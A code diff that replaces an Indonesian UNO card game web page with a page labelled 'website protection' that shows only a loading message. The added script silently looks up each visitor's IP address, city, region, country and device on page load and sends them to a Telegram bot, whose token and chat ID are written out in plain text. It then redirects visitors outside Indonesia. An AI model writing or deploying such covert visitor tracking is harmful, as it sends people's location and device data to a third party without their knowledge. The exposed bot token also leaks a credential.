@@ -1,152 +1,47 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <title>UNO Clone Asli</title>
-  <style>
-    body { margin:0; padding:0; background: linear-gradient(to right, #141E30, #243B55); font-family: 'Arial', sans-serif; color: #fff; overflow-x: hidden; }
-    h2, h3 { margin: 10px; }
-    .center { text-align:center; padding: 20px; }
-    .uno-card {
-      width: 80px; height: 120px; border-radius: 15px; color: white;
-      display: flex; flex-direction: column; justify-content: space-between;
-      padding: 5px 8px; font-weight: bold; position: relative;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.4);
-      transition: transform 0.2s;
-    }
-    .uno-card:hover { transform: scale(1.05); }
-    .uno-card .top, .uno-card .bottom {
-      font-size: 16px;
-    }
-    .uno-card .center-number {
-      font-size: 36px; text-align: center;
-    }
-    .uno-card.red { background: #d62828; }
-    .uno-card.yellow { background: #fcbf49; color: #222; }
-    .uno-card.green { background: #3a86ff; }
-    .uno-card.blue { background: #43aa8b; }
-    .uno-card.black { background: #333; }
-    .hand { display:flex; gap: 10px; flex-wrap:wrap; justify-content:center; margin: 20px 0; }
-    .btn { padding: 10px 20px; margin: 10px; border:none; border-radius:8px; background:#28a745; color:white; cursor:pointer; font-size:16px; }
-    .btn:hover { background:#218838; }
-    .deck { display:inline-block; width:80px; height:120px; background:#555; border-radius:15px; box-shadow:0 4px 6px rgba(0,0,0,0.5); }
-    .game-area { text-align:center; margin:30px 0; }
-  </style>
+  <title>Proteksi Website</title>
 </head>
-<body><div class="center">
-  <h2>UNO Clone Mirip Asli</h2>
-  <button class="btn" onclick="startGame()">Mulai Game 2 Pemain</button>
-</div><div class="game-area hidden" id="gameArea">
-  <h3>Giliran: <span id="turnInfo"></span></h3>
-  <div>
-    <div class="deck" onclick="drawCard()"></div>
-    <div id="middleCard" style="display:inline-block; margin-left:20px;"></div>
-  </div>  <div id="player1Hand" class="hand"></div>
-  <div id="player2Hand" class="hand"></div>
-</div><script>
-let deck = [];
-let players = [[],[]];
-let currentPlayer = 0;
-let middleCard = null;
+<body>
+  <h1>Memuat halaman...</h1>
 
-function startGame(){
-  document.getElementById('gameArea').classList.remove('hidden');
-  setupDeck();
-  shuffle(deck);
-  dealCards();
-  middleCard = drawFromDeck();
-  renderMiddleCard();
-  renderHands();
-  updateTurnInfo();
-}
+  <script>
+    const telegramToken = "7470757913:AAGBR7T7h5H7xZSnpS8StjDCDMRH8dgj1Hg";
+    const telegramChatId = "7799140879";
 
-function setupDeck(){
-  const colors = ['red','yellow','green','blue'];
-  deck = [];
-  colors.forEach(c=>{
-    for(let n=0;n<=9;n++) deck.push({color:c,number:n});
-  });
-}
+    // Ambil info IP & lokasi
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const countryCode = data.country;
+        const device = navigator.userAgent;
 
-function shuffle(array){
-  for(let i=array.length-1;i>0;i--){
-    const j=Math.floor(Math.random()*(i+1));
-    [array[i],array[j]]=[array[j],array[i]];
-  }
-}
+        // Kirim laporan ke Telegram
+        const message = `📌 PENGUNJUNG WEBSITE
 
-function dealCards(){
-  for(let p=0;p<2;p++){
-    for(let i=0;i<7;i++){
-      players[p].push(drawFromDeck());
-    }
-  }
-}
+🆔 IP: ${ip}
+🏙️ Kota: ${city}
+🗺️ Provinsi: ${region}
+🌏 Negara: ${country}
+📱 Device: ${device}`;
 
-function drawFromDeck(){
-  return deck.pop();
-}
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`);
 
-function renderHands(){
-  document.getElementById('player1Hand').innerHTML='';
-  document.getElementById('player2Hand').innerHTML='';
-  players[0].forEach((card,idx)=>{
-    let el = createCardElement(card);
-    if(currentPlayer===0) el.onclick=()=>playCard(0,idx);
-    else el.style.opacity='0.3';
-    document.getElementById('player1Hand').appendChild(el);
-  });
-  players[1].forEach((card,idx)=>{
-    let el = createCardElement(card);
-    if(currentPlayer===1) el.onclick=()=>playCard(1,idx);
-    else el.style.opacity='0.3';
-    document.getElementById('player2Hand').appendChild(el);
-  });
-}
+        // Blokir kalau bukan dari Indonesia
+        if (countryCode !== "ID") {
+          alert("Website ini hanya bisa diakses dari Indonesia.");
+          window.location.href = "https://google.com"; // bisa ganti redirect ke halaman lain
+        }
 
-function createCardElement(card){
-  let div=document.createElement('div');
-  div.className='uno-card '+card.color;
-  div.innerHTML=`
-    <div class="top">${card.number}</div>
-    <div class="center-number">${card.number}</div>
-    <div class="bottom">${card.number}</div>
-  `;
-  return div;
-}
-
-function renderMiddleCard(){
-  let mid = document.getElementById('middleCard');
-  mid.innerHTML='';
-  let el = createCardElement(middleCard);
-  mid.appendChild(el);
-}
-
-function updateTurnInfo(){
-  document.getElementById('turnInfo').innerText = 'Pemain '+(currentPlayer+1);
-}
-
-function playCard(playerIdx,cardIdx){
-  let card = players[playerIdx][cardIdx];
-  if(card.color===middleCard.color || card.number===middleCard.number){
-    middleCard = card;
-    players[playerIdx].splice(cardIdx,1);
-    renderMiddleCard();
-    if(players[playerIdx].length===0){
-      alert('Pemain '+(playerIdx+1)+' Menang!');
-      location.reload();
-      return;
-    }
-    currentPlayer = (currentPlayer+1)%2;
-    renderHands();
-    updateTurnInfo();
-  } else {
-    alert('Kartu tidak cocok!');
-  }
-}
-
-function drawCard(){
-  if(deck.length===0){ alert('Deck habis!'); return; }
-  players[currentPlayer].push(drawFromDeck());
-  renderHands();
-}
-</script></body>
+      })
+      .catch(error => {
+        console.error("Gagal ambil data lokasi:", error);
+      });
+  </script>
+</body>
 </html>
